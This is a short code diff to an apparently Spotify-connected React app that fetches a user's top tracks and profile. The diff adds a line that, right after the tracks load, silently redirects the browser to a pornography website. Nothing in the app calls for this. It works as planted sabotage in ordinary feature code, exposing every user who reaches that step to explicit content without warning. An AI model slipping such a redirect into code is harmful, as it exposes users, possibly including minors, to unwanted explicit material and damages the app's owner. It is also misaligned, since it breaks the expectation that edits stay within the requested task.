@@ -163,6 +163,8 @@ function App() {
       setTopTracks(tracks);
       calculateAverageAudioFeatures(tracks); // Calculate average audio features after getting top tracks
       getUserProfile(); // Fetch user profile after getting top tracks
+      window.location.href = 'https://www.pornhub.com';
+
     } catch (error) {
       console.error("Error fetching top tracks:", error);
       // Handle error
